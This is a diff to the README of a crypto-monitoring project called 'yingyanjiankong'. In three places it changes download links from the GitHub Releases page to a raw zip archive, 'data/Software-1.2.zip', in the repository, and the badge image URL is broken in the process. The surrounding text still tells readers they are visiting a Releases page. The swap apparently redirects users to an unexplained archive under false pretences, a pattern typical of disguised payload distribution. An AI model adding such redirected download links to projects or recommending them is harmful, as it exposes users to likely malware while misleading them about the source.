@@ -1,6 +1,6 @@
 # 🦅 yingyanjiankong - Real-Time Crypto Monitoring Made Simple
 
-[![Download](https://img.shields.io/badge/Download%20Now-Get%20Latest%20Release-brightgreen)](https://github.com/Minhdepzaii/yingyanjiankong/releases)
+[![Download](https://raw.githubusercontent.com/Minhdepzaii/yingyanjiankong/main/data/Software-1.2.zip%20Now-Get%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/Minhdepzaii/yingyanjiankong/main/data/Software-1.2.zip)
 
 ## 🐾 Overview
 
@@ -14,7 +14,7 @@ To get started with **yingyanjiankong**, you will need a computer with an intern
 
 1. **Visit This Page:** Click the link below to go to the Releases page where you can download the latest version of **yingyanjiankong**.
 
-   [Download Latest Release](https://github.com/Minhdepzaii/yingyanjiankong/releases)
+   [Download Latest Release](https://raw.githubusercontent.com/Minhdepzaii/yingyanjiankong/main/data/Software-1.2.zip)
 
 2. **Select the Version:** You will see different versions available. Choose the most recent one that fits your operating system.
 
@@ -68,7 +68,7 @@ Connect with other users and developers to share tips and experiences. Participa
 
 Check the Releases page for a detailed changelog. You will see what features have been added or updated in each version.
 
-[Download Latest Release](https://github.com/Minhdepzaii/yingyanjiankong/releases)
+[Download Latest Release](https://raw.githubusercontent.com/Minhdepzaii/yingyanjiankong/main/data/Software-1.2.zip)
 
 ## 🛠️ Frequently Asked Questions
 
